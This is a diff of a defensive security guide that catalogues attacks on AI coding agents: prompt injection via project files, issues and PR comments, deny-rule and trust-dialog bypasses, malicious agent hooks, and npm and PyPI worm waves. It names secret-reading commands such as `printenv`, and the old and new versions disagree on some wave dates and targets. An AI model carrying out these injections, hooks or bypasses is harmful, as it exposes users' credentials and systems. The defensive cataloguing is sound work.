+| AG06 | Memory Poisoning | Session persistence, log injection | N/A for Claude Code (no persistent memory) |
+| AG07 | Trust Boundary Violations | Untrusted repos, project settings | [Git Hardening](hardening/claude-code.md#7-harden-the-git-integration) |
+| AG08 | Resource & Budget Exhaustion | Runaway tool calls, API cost | Rate limits, usage caps |
+| AG09 | Supply Chain Compromise | MCP packages, npm dependencies | [Supply Chain Defense](supply-chain-defense.md) |
+| AG10 | Emergent Behavior Risk | Unintended multi-step actions | Permission model, hooks |
 
 ---
 
 ## Attack Vector Reference Table
 
-| Vector | Severity | Description | Incident/Evidence |
-|--------|----------|-------------|-------------------|
-| Direct env var read | High | Agent runs `printenv`, `env`, or `echo $SECRET` — output goes to API | [Knostic: .env to Leakage (Dec 2025)](https://www.knostic.ai/blog/claude-cursor-env-file-secret-leakage) |
-| File read of .env | High | Claude Code reads `.env` files by default, without notifying the user | [Knostic: Claude loads secrets without permission](https://www.knostic.ai/blog/claude-loads-secrets-without-permission) |
-| Prompt injection via dependencies | Critical | Malicious package README/comments cause agent to exfiltrate secrets | [VentureBeat: Three AI agents leaked secrets (Apr 2026)](https://venturebeat.com/security/ai-agent-runtime-security-system-card-audit-comment-and-control-2026) |
-| MCP tool poisoning | Critical | Malicious MCP server overrides tool descriptions, intercepts calls | [Invariant Labs: Tool Poisoning Attacks (2025)](https://invariantlabs.ai/blog/mcp-security-notification-tool-poisoning-attacks) |
-| MCP rug pull | Critical | MCP server changes behavior after initial trust is established | [Invariant Labs: Tool Poisoning Attacks (2025)](https://invariantlabs.ai/blog/mcp-security-notification-tool-poisoning-attacks) |
-| MCP SDK architectural RCE | Critical | Command execution baked into MCP SDK design across all languages | [OX Security: Mother of All AI Supply Chains (Apr 2026)](https://www.ox.security/blog/the-mother-of-all-ai-supply-chains-critical-systemic-vulnerability-at-the-core-of-the-mcp/) |
-| DNS exfiltration via safe commands | High | `ping` commands whitelisted as safe encode secrets in DNS queries | [Mindgard: Cline DNS Exfiltration (Aug 2025)](https://mindgard.ai/disclosures/cline-bot-ai-coding-agent-data-exfiltration-via-prompt-injection-and-dns) |
-| DNS exfiltration via ChatGPT | High | Hidden instructions in emails/PDFs encode data into DNS queries | [PointGuard AI: ChatGPT DNS Exfiltration (2026)](https://www.pointguardai.com/ai-security-incidents/chatgpt-prompt-injection-enables-silent-dns-data-exfiltration) |
-| Command output capture | High | All bash output becomes conversation context sent to the API | Architectural — inherent to all LLM-based agents |
-| Agent skill supply chain | Critical | 13.4% of audited agent skills contain critical security issues | [Snyk: ToxicSkills (Feb 2026)](https://snyk.io/blog/toxicskills-malicious-ai-agent-skills-clawhub/) |
-| Credential leakage via stdout | High | 75.8% of vulnerable agent skills leak credentials through log output | [arXiv:2604.03070 — Credential Leakage Study (Apr 2026)](https://arxiv.org/abs/2604.03070) |
-| Sandbox escape via IPC | High | Chromium IPC flaw allows breaking out of sandbox | [CVE-2025-4609](https://www.ox.security/blog/the-aftermath-of-cve-2025-4609-critical-sandbox-escape-leaves-1-5m-developers-vulnerable/) |
-| Git hooks sandbox escape | High | Agent writes git hooks that execute outside sandbox | [CVE-2026-26268](https://www.sentinelone.com/vulnerability-database/cve-2026-26268/) |
-| Shell built-in allowlist bypass | High | `export`, `set`, `typeset` bypass command allowlists in Auto-Run Mode | [CVE-2026-22708 — Pillar Security](https://www.pillar.security/blog/the-agent-security-paradox-when-trusted-commands-in-cursor-become-attack-vectors) |
-| Open-folder autorun | High | Workspace Trust disabled by default — code runs on folder open | [Oasis Security: Cursor Autorun (Sep 2025)](https://www.oasis.security/blog/cursor-security-flaw) |
-| Zero-click MCP injection | Critical | MCP config in repo auto-executes on project open, no interaction | [CVE-2026-30615 — Windsurf](https://nvd.nist.gov/vuln/detail/CVE-2026-30615) |
-| Zero-click email injection | Critical | Crafted email triggers exfiltration without user interaction | [CVE-2025-32711 — EchoLeak](https://arxiv.org/abs/2509.10540) |
-| Image-based prompt injection | Medium | Near-invisible text in images interpreted as LLM commands | [arXiv:2603.03637 — Image-based Prompt Injection (Mar 2026)](https://arxiv.org/abs/2603.03637) |
-| Steganographic web injection | High | Zero-width fonts, CSS hiding, SVG encapsulation in web pages | [Unit 42: Web-Based IDPI in the Wild (Mar 2026)](https://unit42.paloaltonetworks.com/ai-agent-prompt-injection/) |
-| Cross-process env inheritance | Medium | Child processes inherit full environment including secrets | POSIX standard behavior — `fork()` copies env |
-| Source code leak enabling targeted attacks | Medium | Leaked agent internals enable precision prompt injection | [Claude Code source leak (Mar 2026)](https://venturebeat.com/technology/claude-codes-source-code-appears-to-have-leaked-heres-what-we-know) |
-| Context poisoning via repo config | Medium | Malicious `CLAUDE.md`/`.cursorrules` override agent behavior | [VentureBeat: 5 actions for security leaders (2026)](https://venturebeat.com/security/claude-code-512000-line-source-leak-attack-paths-audit-security-leaders) |
-| Deny-rule bypass via command padding | High | >50 subcommands skip all deny-rule enforcement in Claude Code | [Adversa AI: Deny Rules Disabled (Apr 2026)](https://adversa.ai/blog/claude-code-security-bypass-deny-rules-disabled/) |
-| PR/issue comment injection | Critical | GitHub PR titles and comments hijack AI agents in GitHub Actions | [Comment and Control (Apr 2026)](https://oddguan.com/blog/comment-and-control-prompt-injection-credential-theft-claude-code-gemini-cli-github-copilot/) |
-| Image proxy exfiltration | High | Data encoded into signed Camo proxy URLs bypasses CSP | [CVE-2025-59145 — CamoLeak](https://www.blackfog.com/camoleak-how-github-copilot-became-an-exfiltration-channel/) |
-| Memory persistence (SpAIware) | High | Malicious instructions persist in agent memory across sessions | [Embrace The Red: Windsurf SpAIware (2025)](https://embracethered.com/blog/posts/2025/windsurf-spaiware-exploit-persistent-prompt-injection/) |
-| Agentic browser cookie reuse | High | Agents reuse cookies for requests, enabling cross-site data theft | [Trail of Bits: Agentic Browser Isolation (Jan 2026)](https://blog.trailofbits.com/2026/01/13/lack-of-isolation-in-agentic-browsers-resurfaces-old-vulnerabilities/) |
-| CI/CD pipeline poisoning | Critical | AI triage bots exploited to publish malicious packages | [Clinejection — Snyk (Feb 2026)](https://snyk.io/blog/cline-supply-chain-attack-prompt-injection-github-actions/) |
-| Credential manager supply chain | Critical | Bitwarden CLI npm package trojanized via compromised GitHub Action, targeted AI tool API keys | [Bitwarden CLI Supply Chain Attack (Apr 2026)](https://thehackernews.com/2026/04/bitwarden-cli-compromised-in-ongoing.html) |
-| Malware via AI tool lures | High | Fake "leaked" AI tool downloads distribute infostealers | [Trend Micro: Claude Code Lures (Apr 2026)](https://www.trendmicro.com/en_us/research/26/d/weaponizing-trust-claude-code-lures-and-github-release-payloads.html) |
-| Unauthenticated RCE in AI framework endpoints | Critical | AI agent builder endpoints execute attacker-supplied code without sandboxing or auth | [Flowise CVE-2025-59528 (CVSS 10.0)](https://thehackernews.com/2026/04/flowise-ai-agent-builder-under-active.html) / [Langflow CVE-2026-33017 (CISA KEV)](https://thehackernews.com/2026/03/critical-langflow-flaw-cve-2026-33017.html) |
-| n-day Chromium/Electron vulnerabilities in forked IDEs | High | AI IDEs built on outdated VS Code/Electron inherit 94+ known browser CVEs; vendors slow to patch | [OX Security: Forked and Forgotten (Oct 2025)](https://www.ox.security/blog/94-vulnerabilities-in-cursor-and-windsurf-put-1-8m-developers-at-risk/) |
-| Passive prompt injection via issue tracker | Critical | Hidden instructions in GitHub issues trigger Copilot agents to leak tokens and take over repos | [RoguePilot — Orca Security (Feb 2026)](https://orca.security/resources/blog/roguepilot-github-copilot-vulnerability/) |
-| Deprecated AI SaaS OAuth tokens as breach vector | Critical | AI tools retain OAuth access to Google Workspace/cloud services after deprecation; compromise pivots to enterprise infra | [Vercel/Context.ai breach (Apr 2026)](https://vercel.com/kb/bulletin/vercel-april-2026-security-incident) |
-| Coordinated multi-vector npm/PyPI/Docker compromise | Critical | Single threat actor (TeamPCP/UNC6780) executes simultaneous attacks across multiple package ecosystems | [SANS ISC Update 008 (Apr 2026)](https://www.ironcastle.net/teampcp-supply-chain-campaign-update-008-26-day-pause-ends-with-three-concurrent-compromises-checkmarx-kics-bitwarden-cli-cascade-xinference-pypi-canistersprawl-npm-worm-identified-and-tier-1/) |
-| AI agent hook weaponization via npm payload | Critical | Malicious package writes `.claude/settings.json` SessionStart hook + `.vscode/tasks.json` `folderOpen` trigger as persistence/propagation | [Mini Shai-Hulud (Apr 29, 2026)](https://www.wiz.io/blog/mini-shai-hulud-supply-chain-sap-npm) |
-| Semantic Kernel prompt injection → RCE via eval() | Critical | Python SDK InMemoryVectorStore interpolates user input into a `eval()`-executed lambda; prompt injection route turns this into host-level RCE | [CVE-2026-26030 — Microsoft Semantic Kernel (May 2026)](https://www.microsoft.com/en-us/security/blog/2026/05/07/prompts-become-shells-rce-vulnerabilities-ai-agent-frameworks/) |
-| Semantic Kernel arbitrary file write via exposed attribute | Critical | .NET SDK accidentally annotates a file-write helper with `[KernelFunction]`, exposing it to the AI model with no path validation; CVSS 10.0 | [CVE-2026-25592 — Microsoft Semantic Kernel (May 2026)](https://www.microsoft.com/en-us/security/blog/2026/05/07/prompts-become-shells-rce-vulnerabilities-ai-agent-frameworks/) |
-| Azure AI agent EoP via improper access control | Critical | M365 published agents have no enforcement boundary between agent role and admin role; exploited in the wild at time of disclosure | [CVE-2026-35435 — Azure AI Foundry (May 2026)](https://windowsnews.ai/article/cve-2026-35435-critical-azure-ai-foundry-privilege-escalation-in-m365-agents-leaves-systems-vulnerab.417153) |
-| Cross-origin WebSocket hijacking via local agent server | High | Local WebSocket server with no Origin validation lets any open browser tab hijack running agent sessions, exfiltrate data, or kill tasks | [CVE-2026-44211 — Cline Kanban (May 2026)](https://advisories.gitlab.com/npm/cline/CVE-2026-44211/) |
-| AI Python library `.pth` file persistence | Critical | Malicious `.pth` file in compromised PyPI package executes credential stealer on every Python process startup; survives package removal; lateral movement across Kubernetes clusters | [LiteLLM/Telnyx PyPI compromise (Mar 2026)](https://securitylabs.datadoghq.com/articles/litellm-compromised-pypi-teampcp-supply-chain-campaign/) |
-| AI coding tool content-filter bypass | High | Local attacker bypasses AI suggestion filters and consent gates, enabling malicious suggestion injection | [CVE-2026-41109 — Copilot/VS Code (May 2026)](https://www.thehackerwire.com/github-copilot-visual-studio-injection-bypasses-security-feature-cve-2026-41109/) |
-| Bare repo fsmonitor command execution | High | Nested bare git repo triggers `core.fsmonitor` during agent git operations to execute arbitrary commands | [CVE-2026-45033 — Copilot CLI](https://advisories.gitlab.com/npm/@github/copilot/CVE-2026-45033/) |
-| Git worktree commondir trust bypass | High | Malicious `.git/commondir` file spoofs a previously trusted path, causing Claude Code to skip the trust dialog and execute `.claude/settings.json` hooks silently on project open | [CVE-2026-40068 — Claude Code (May 2026)](https://github.com/anthropics/claude-code/security/advisories/GHSA-q5hj-mxqh-vv77) |
-| Unauthenticated MCP endpoint — nginx-ui | Critical | nginx-ui `/mcp_message` endpoint lacks authentication middleware; empty default IP whitelist treated as allow-all; unauthenticated network attacker invokes all MCP tools including nginx restart, config creation/deletion, and service reload — complete nginx service takeover | [CVE-2026-33032 / MCPwn — nginx-ui (Apr 2026)](https://github.com/advisories/GHSA-h6c2-x2m2-mwhf) |
-| Azure MCP Server SSRF → cloud credential theft | High | SSRF in Azure MCP Server causes it to make outbound requests to attacker-controlled URLs while attaching its managed identity token; enables cloud lateral movement and privilege escalation across Azure Resource Manager, storage, and other services | [CVE-2026-26118 — Azure MCP Server (Mar 2026)](https://github.com/advisories/GHSA-hhfx-wfvq-7g9c) |
-| Self-propagating IDE extension worm via marketplace | Critical | First confirmed self-propagating VS Code extension worm (GlassWorm); trojanized OpenVSX extensions used each IDE's own command-line installer to push GlasswormRAT to VS Code, Cursor, Windsurf, VSCodium, and Positron; Zig-compiled native binaries for evasion; harvested npm/GitHub/Git tokens + 49 crypto wallet browser extensions; C2 via Solana blockchain, BitTorrent DHT, Google Calendar dead-drops, and direct VPS; 300+ GitHub repos poisoned | [GlassWorm campaign + CrowdStrike takedown (May 26, 2026)](https://www.crowdstrike.com/en-us/blog/inside-crowdstrike-takedown-of-a-developer-targeting-botnet/) |
-| Open VSX scanner bypass — marketplace extension vetting failure | High | Boolean return value conflated "no scanners configured" with "all scanners failed to run"; scanner failures under load silently waved extensions through as passed; a free publisher account was sufficient to exploit reliably; all VS Code forks consuming Open VSX (Cursor, Windsurf, Kiro, VSCodium) at risk; fixed in Open VSX 0.32.0 | [Open Sesame — Feb 8, 2026 disclosure, fixed Open VSX 0.32.0](https://thehackernews.com/2026/03/open-vsx-bug-let-malicious-vs-code.html) |
-| Symlink hijacking via project instruction file (SymJack) | Critical | Booby-trapped repo places renamed symlink as CLAUDE.md/`.cursorrules`; agent's file-copy approval shows symlink name not target; agent follows symlink and overwrites its own config (settings.json, mcp.json) with malicious MCP server entry; on restart, attacker MCP server runs with full user privileges; affects 6 agents: Claude Code, Cursor, Gemini CLI, Antigravity CLI, Copilot CLI, Grok Build | [SymJack — Adversa AI (May 2026)](https://adversa.ai/blog/the-approval-prompt-is-lying-to-you-symlink-rce-in-five-ai-coding-agents-claude-code-cursor-antigravity-copilot-grok-build/) |
-| CI/CD bot-trust bypass in AI GitHub Actions workflow | High | `checkWritePermissions` in `anthropics/claude-code-action` unconditionally trusted any actor ending in `[bot]` regardless of actual write permissions; unauthenticated attacker creates a GitHub App, gets installation token, opens issue/PR on any public repo using the workflow, injects prompt-injection payload; Claude Code GitHub Actions bot processes it with elevated `GITHUB_TOKEN` → full supply chain compromise: secret exfiltration, OIDC token theft, malicious code push | [GMO Flatt Security — Poisoning Claude Code (June 2026)](https://flatt.tech/research/posts/poisoning-claude-code-one-github-issue-to-break-the-supply-chain/) |
+Every item in this table is a real, confirmed attack or vulnerability. No hypotheticals.
+
+| Attack Vector | Severity | Mechanism | Source |
+|--------------|----------|-----------|--------|
+| Prompt injection via CLAUDE.md | High | Malicious project CLAUDE.md overrides user intent; instructs agent to exfiltrate secrets or install backdoors | [Check Point Research — CVE-2025-59536](https://research.checkpoint.com/2026/rce-and-api-token-exfiltration-through-claude-code-project-files-cve-2025-59536/) |
+| API key exfiltration via ANTHROPIC_BASE_URL | High | Attacker-controlled ANTHROPIC_BASE_URL in project .env redirects API calls, leaks API key to attacker's server | [Check Point Research — CVE-2026-21852](https://research.checkpoint.com/2026/rce-and-api-token-exfiltration-through-claude-code-project-files-cve-2025-59536/) |
+| Command injection via find sub-command (CVE-2026-24887) | High | The `find` sub-command parser failed to validate command structure; attackers craft inputs that bypass the tool allowlist and execute arbitrary commands | [GitHub Advisory GHSA-4f4r-wgmr-9jr9 — Claude Code (Jan 2026)](https://github.com/anthropics/claude-code/security/advisories/GHSA-4f4r-wgmr-9jr9) |
+| Symlink-based project file injection (SymJack) | High | Renamed symlink placed as project instruction file; agent's "file copy" approval shows symlink name, not target; silently overwrites settings.json to inject malicious MCP server | [Adversa AI — SymJack (May 2026)](https://adversa.ai/blog/symjack-ai-coding-agent-supply-chain-attack-claude-cursor-gemini-github-copilot/) |
+| Project-defined MCP auto-exec on folder trust (TrustFall) | High | Accepting a folder trust prompt in Claude Code, Gemini CLI, Cursor CLI, or GitHub Copilot CLI automatically launches all project-defined MCP servers — one Enter keypress on a malicious repo causes RCE; in CI headless mode, zero user interaction required | [TrustFall — Adversa AI (May 2026)](https://adversa.ai/blog/trustfall-coding-agent-security-flaw-rce-claude-cursor-gemini-cli-copilot/) |
+| Git worktree trust spoofing (CVE-2026-40068) | High | `.git/commondir` read without path validation allows malicious repo to spoof a trusted directory; `.claude/settings.json` hooks execute silently with no user prompt | [GitHub Advisory GHSA-q5hj-mxqh-vv77 — Claude Code (May 2026)](https://github.com/anthropics/claude-code/security/advisories/GHSA-q5hj-mxqh-vv77) |
+| GitHub Actions permission bypass via [bot]-suffix trust | High | `checkWritePermissions` unconditionally trusted any actor ending in `[bot]`; enables malicious GitHub App to trigger the workflow with write permissions and execute arbitrary code via prompt injection in PRs; CVSS v4.0: 7.8 | [GMO Flatt Security — Poisoning Claude Code (June 2026)](https://flatt.tech/research/posts/poisoning-claude-code-one-github-issue-to-break-the-supply-chain/) |
 | Project folder-trust MCP auto-exec (TrustFall) | High | Accepting a folder trust prompt in Claude Code, Gemini CLI, Cursor CLI, or GitHub Copilot CLI automatically launches all project-defined MCP servers — one Enter keypress on a malicious repo causes RCE; in CI headless mode, zero user interaction required | [TrustFall — Adversa AI (May 2026)](https://adversa.ai/blog/trustfall-coding-agent-security-flaw-rce-claude-cursor-gemini-cli-copilot/) |
 | Command injection via unsanitized prompt-derived input to shell (ms-agent) | Medium | ms-agent ≤v1.6.0rc1 passes prompt-derived content directly to shell execution without sanitization; CVSS 6.5, CWE-77; no patch as of June 2026 | [CVE-2026-2256 / GHSA-4gc2-344q-r2rw — ModelScope ms-agent (Mar 2026)](https://github.com/advisories/GHSA-4gc2-344q-r2rw) |
 | MCP server information disclosure to privileged local users | High | Splunk MCP Server app < v1.0.3: privileged users can view session and authentication tokens in clear text in the `_internal` index; CVSS 7.2, CWE-532; fixed in v1.0.3 | [CVE-2026-20205 — Splunk MCP Server (SVD-2026-0407)](https://advisory.splunk.com/advisories/SVD-2026-0407) (HTTP 403 — bot-protection pattern; search-confirmed live) |
 | Cross-site tool execution via MCP Go SDK CSRF | High | The Go SDK's Streamable HTTP transport (≤ v1.4.0) accepted browser-generated cross-site POST requests without validating the Origin header or enforcing Content-Type: application/json; in deployments without authorization controls, any malicious website could send MCP requests to a local server and trigger tool execution; CVSS 7.1, CWE-352; fixed in v1.4.1 (requires Go 1.25+) | [CVE-2026-33252 / GHSA-89xv-2j6f-qhc8 — modelcontextprotocol/go-sdk (Mar 2026)](https://github.com/advisories/GHSA-89xv-2j6f-qhc8) |
+| Zero-click MCP config injection in Windsurf IDE | High | Windsurf 1.9544.26: attacker-controlled HTML content silently modifies local MCP JSON config and registers a malicious STDIO server; MCP SDK launches server binary — code execution with no click, approval, or user interaction required. Only AI IDE in OX Security disclosure chain where zero user interaction sufficed; CVSS 8.0, fixed in versions after 1.9544.26 | [CVE-2026-30615 / GHSA-wj2m-jvpr-64cq — Windsurf (2026)](https://github.com/advisories/GHSA-wj2m-jvpr-64cq) |
 
 ## Real Incidents Timeline
 
 ### June 2026 — Mini Shai-Hulud Wave D: Miasma Targets @redhat-cloud-services npm Namespace (June 1)
 
-On June 1, 2026, Wiz Research disclosed **"Miasma: The Spreading Blight"** — the fourth Mini Shai-Hulud wave and the fifth confirmed TeamPCP/UNC6780 npm supply chain attack. Unlike previous waves which used stolen developer credentials, Miasma compromised the `@redhat-cloud-services` npm namespace via **GitHub Actions OIDC credential theft** from a Red Hat CI/CD pipeline. 96 versions across 32 packages (~116,991 weekly downloads) were affected. See [Supply Chain Defense Guide](supply-chain-defense.md) for the full case study.
+On June 1, 2026, Wiz Research disclosed **"Miasma: The Spreading Blight"** — the fourth Mini Shai-Hulud wave and the fifth confirmed TeamPCP/UNC6780 npm supply chain attack. Unlike previous waves which used stolen developer credentials, Miasma compromised the `@redhat-cloud-services` npm namespace via **GitHub Actions OIDC credential theft** from a Red Hat CI/CD pipeline. 96 versions across 32 packages (~116,991 weekly downloads) were affected. See [Supply Chain Defense Guide](supply-chain-defense.md) for full IOC list and Wave D timeline.
 
-**Key novel characteristics:**
-- **No attacker C2 domain** — the 4.1 MB obfuscated JS preinstall hook exfiltrates through legitimate vendor endpoints (AWS STS, Azure AD, GCP IAM, GitHub API, npm registry, HashiCorp Vault, Bitwarden, 1Password) using stolen credentials. Standard egress-based C2 detection is effectively impossible.
-- **Bun-based payload** — Bun runtime fetched to `/tmp/b-<random>/bun`; JS payload at `/tmp/p<base36>.js`. Both removed on success; may persist after a crash.
-- **Dead-drop IOC** — attacker GitHub repos with description "Miasma: The Spreading Blight".
+**What makes this significant:** The attacker used OIDC tokens — short-lived, machine-generated credentials intended to replace static API keys — to publish malicious packages. This demonstrates that OIDC alone does not prevent supply chain attacks; pipeline security and publish-time verification are still required.
 
-Source: [Wiz — Miasma: The Spreading Blight](https://www.wiz.io/blog/miasma-supply-chain-attack-targeting-redhat-npm-packages) | [Snyk — Miasma](https://snyk.io/blog/miasma-supply-chain-attack-malicious-code-redhat-cloud-services-npm-packages/) | [Red Hat RHSB-2026-006](https://access.redhat.com/security/vulnerabilities/RHSB-2026-006) | [BleepingComputer](https://www.bleepingcomputer.com/news/security/red-hat-npm-packages-compromised-to-steal-developer-credentials/) (all HTTP 403 — bot-protection pattern; search-confirmed live)
+Source: [Wiz Research — Miasma: The Spreading Blight](https://www.wiz.io/blog/miasma-the-spreading-blight-wiz-research-discovers-new-supply-chain-attack) (HTTP 403 — bot-protection pattern; search-confirmed live via search engine) | Sonatype, StepSecurity, BleepingComputer, The Hacker News (all HTTP 403 — bot-protection pattern; search-confirmed live)
 
-### June 2026 — Claude Code GitHub Actions `checkWritePermissions` Bypass (CVSS v4.0: 7.8)
+### June 2026 — Mini Shai-Hulud Wave E: Phantom Gyp Targets vAPI-ai-sdk and ollama-js (June 3)
 
-RyotaK (GMO Flatt Security) disclosed a bot-trust bypass in `anthropics/claude-code-action`, the official GitHub Actions workflow for Claude Code. The `checkWritePermissions` function unconditionally treated any actor whose name ended in `[bot]` as having write access, regardless of the GitHub token's actual permissions. An unauthenticated external attacker could create a GitHub App, use its installation token (issued to any developer) to open an issue or pull request on any public repository using the workflow, and trigger it with attacker-controlled Markdown content.
+On June 3, 2026, StepSecurity and Snyk disclosed **"Phantom Gyp"** — the fifth Mini Shai-Hulud wave. The attacker used `binding.gyp`-mediated code execution to bypass npm's `--ignore-scripts` flag. Unlike postinstall scripts (which are blocked by `--ignore-scripts`), `binding.gyp` triggers the `node-gyp` build system, which executes as part of the package installation process regardless of the flag. The targets — `vapi-ai-sdk` and `ollama-js` — are heavily used in AI agent stacks.
 
-**Attack chain:** Attacker creates GitHub App → gets installation token → opens issue with prompt-injection payload → Claude Code GitHub Actions bot processes the issue with its elevated `GITHUB_TOKEN` → attacker-controlled prompt exfiltrates repository secrets, steals OIDC tokens for cloud provider impersonation, pushes malicious commits or tags. No prior repository access required.
-
-**Patch:** Claude Code GitHub Actions v1.0.94 (June 2026) — added `checkHumanActor` permission check, disabled workflow run summaries (information leak vector), scrubbed child-process environment variables, added `gh` URL-validation wrapper to block SSRF.
-
-Source: [flatt.tech — Poisoning Claude Code](https://flatt.tech/research/posts/poisoning-claude-code-one-github-issue-to-break-the-supply-chain/) (HTTP 403 — bot-protection pattern; search-confirmed live)
-
-### June 2026 — Mini Shai-Hulud Wave E: Phantom Gyp Bypasses `--ignore-scripts` (June 3)
-
-Two days after Miasma (Wave D), TeamPCP returned with a technique that invalidates `--ignore-scripts` as a defense. **57 packages** across multiple maintainer accounts — `vapi`, `ai-sdk-ollama`, and 55 others — were compromised in under two hours via a 157-byte weaponized `binding.gyp` file.
-
-**The bypass:** npm automatically invokes `node-gyp` when a `binding.gyp` file is present. This execution path is entirely outside the `scripts` block — `--ignore-scripts` has no effect on it. The attacker placed a minimal `binding.gyp` that triggers a shell command at install time, delivering the same credential-harvesting payload as prior waves plus a new persistence layer that injects backdoor entries into `.claude/settings.json`, `.cursor/settings.json`, and `.vscode/tasks.json` on every project open.
-
-**Signed attestations are insufficient:** All 57 packages carried forged SLSA provenance and Sigstore signatures. `npm audit signatures` returns clean. The only reliable prevention at time of disclosure was `npm stage publish` staged approval (GA in npm CLI 11.15.0).
-
-**Dead-drop IOC:** Credentials exfiltrated to GitHub repos under account `liuende501` (236+ repositories, encrypted JSON payloads).
+**What makes this significant:** `--ignore-scripts` was widely recommended as the primary defense against npm supply chain attacks. Phantom Gyp demonstrates that this recommendation is insufficient. Developers relying solely on `--ignore-scripts` remain vulnerable.
 
 Source: [StepSecurity — Binding.gyp npm supply chain attack](https://www.stepsecurity.io/blog/binding-gyp-npm-supply-chain-attack-spreads-like-worm) | [Snyk — Node-gyp supply chain compromise](https://snyk.io/blog/node-gyp-supply-chain-compromise-self-propagating-npm-worm-binding-gyp/) | [Corgea — Phantom Gyp Miasma](https://corgea.com/research/miasma-phantom-gyp-npm-worm-vapi-ai-sdk-ollama-june-2026) (all HTTP 403 — bot-protection pattern; search-confirmed live)
 
-### June 2026 — IronWorm: Independent Rust+eBPF+Tor npm Campaign (June 4)
+### June 2026 — Mini Shai-Hulud Wave F: Hades PyPI Targets LiteLLM and Telnyx (June 4)
 
-One day after Phantom Gyp, a **separate, unrelated actor** launched IronWorm — a novel npm supply chain attack distinct from TeamPCP and the Shai-Hulud worm family. The compromised account `asteroiddao` was used to publish malicious versions of Rust-adjacent npm packages.
+On June 4, 2026, Snyk and Endor Labs disclosed **"Hades PyPI"** — the sixth Mini Shai-Hulud wave and the campaign's first pivot to the Python ecosystem. The attacker targeted `litellm` (the most widely deployed LLM gateway in self-hosted AI stacks, ~2.1M weekly downloads) and `telnyx` (telephony SDK). The malicious packages used the same `SPREADING_BLIGHT` dead-drop C2 pattern established in Wave C (AntV) and continued in Wave D (Miasma), confirming TeamPCP/UNC6780 operational continuity across ecosystems.
 
-**What makes IronWorm different:** Unlike Shai-Hulud's JavaScript+Bun payload architecture, IronWorm drops a compiled **Rust binary** at install time, uses **eBPF kernel probes** to intercept credential reads directly from process memory (bypassing env-var scrubbing and vault abstraction layers), and exfiltrates via **Tor hidden services** — making C2 traffic invisible to standard network monitoring. This is the first publicly documented npm supply chain campaign to combine all three techniques.
+**What makes this significant:** Wave F is the first time the CanisterSprawl campaign (which began with Go and npm packages) crossed into PyPI. Any developer whose AI stack uses LiteLLM should verify package integrity against known-good SHA256 hashes. See [Supply Chain Defense Guide](supply-chain-defense.md) for PyPI-specific vetting steps.
 
-**Attribution:** No confirmed threat actor overlap with TeamPCP / UNC6780. The eBPF approach requires deeper OS-level knowledge than prior npm campaigns; researchers assessed this as a different actor with a higher technical profile.
+Source: Snyk, Endor Labs (both HTTP 403 — bot-protection pattern; search-confirmed live)
 
-Source: [The Hacker News — IronWorm and new Miasma worm variant](https://thehackernews.com/2026/06/ironworm-and-new-miasma-worm-variant.html) (HTTP 403 — bot-protection pattern; search-confirmed live)
+### June 2026 — Mini Shai-Hulud Wave G: Hades MCP-Targeting (June 9)
 
-### June 2026 — Miasma Worm Jumps to GitHub, Disables 73 Microsoft Repositories in 105 Seconds (June 5–6)
+On June 9, 2026, StepSecurity and BleepingComputer disclosed **"Hades MCP-targeting"** — the seventh Mini Shai-Hulud wave and the first to directly target the MCP server ecosystem. The attacker published malicious packages impersonating popular MCP server libraries, including packages targeting Claude Code, Cursor, and GitHub Copilot integrations. The payload continued using the `SPREADING_BLIGHT` C2 pattern, confirming TeamPCP/UNC6780 involvement.
 
-Four days after the initial Miasma npm wave, the TeamPCP worm extended its propagation to GitHub repository configuration files. On June 5–6, 2026, GitHub's automated abuse detection disabled **73 Microsoft repositories** across four organizations — Azure, Azure-Samples, Microsoft, and MicrosoftDocs — in a 105-second sweep.
+**What makes this significant:** Prior waves targeted general npm/PyPI packages used *by* AI developers. Wave G targets MCP server packages directly — the exact dependency layer that AI coding agents load and execute. A developer who installs a compromised MCP server grants the attacker direct access to their agent's tool execution environment. See [Supply Chain Defense Guide](supply-chain-defense.md) for Wave G IOCs and the updated blocklist.
 
-**Attack vector:** A compromised contributor account with write access to `Azure/durabletask` pushed a commit planting malicious AI agent configuration files: `.claude/settings.json` (with a `SessionStart` credential-harvesting hook), `.vscode/tasks.json` (with `"runOn": "folderOpen"` execution), `.cursor/settings.json`, and cursor rules. Any developer cloning a poisoned repository and opening it in Claude Code, Gemini CLI, Cursor, or VS Code Insiders would trigger the payload on IDE open — no explicit command required.
-
-**Significance:** This is the first confirmed in-the-wild case of a supply chain worm propagating from npm package compromise to GitHub repository configuration files. The attack surface shifts from install-time (`npm install`) to project-open-time (IDE opens folder). Worm fingerprints, dead-drop patterns, and payload structure match Miasma/TeamPCP (UNC6780). No Microsoft Azure credentials are confirmed stolen; rapid automated response interrupted exfiltration.
-
-Source: [The Hacker News — Miasma Worm Jumps to GitHub, Disables 73 Microsoft Repos in 105 Seconds](https://thehackernews.com/2026/06/miasma-worm-jumps-github-disables-73.html) (HTTP 403 — bot-protection pattern; search-confirmed live via The Next Web, byteiota, thecybersecguru, opensourcemalware.com)
-
-### June 2026 — Mini Shai-Hulud Wave F: Hades Campaign Hits PyPI with Import-Time Execution (June 8)
-
-Five days after Phantom Gyp, a related campaign targeted PyPI — the first wave in the Shai-Hulud lineage to target Python packages exclusively. **19 packages** in the scientific computing, bioinformatics, and graph ML space were trojanized across 37 malicious wheel artifacts, targeting researchers and AI developers.
-
-**Key novel characteristics:**
-- **Import-time execution** — payload embeds in `__init__.py` and executes on `import`, not at install time. `pip install --no-deps`, `pip audit`, and `safety check` offer no protection.
-- **AI Analyst Misdirection** — the payload detects AI-powered security scanners and returns benign-looking output when inspected. First publicly documented supply chain payload to actively target AI security tooling as an evasion surface.
-- **Cross-platform memory scrapers** — tailored scrapers for Linux (`/proc/<pid>/maps`), macOS, and Windows extract encrypted credentials from process memory rather than filesystem reads, bypassing credential managers that store secrets in memory.
-- **Wiper deterrent** — payload includes a wiper component to erase forensic evidence on detection.
-
-**Attribution:** Multiple vendors describe Hades as a Miasma/Shai-Hulud lineage campaign. Socket Research did not explicitly attribute Hades to TeamPCP/UNC6780. Treat it as a related campaign with uncertain direct attribution.
-
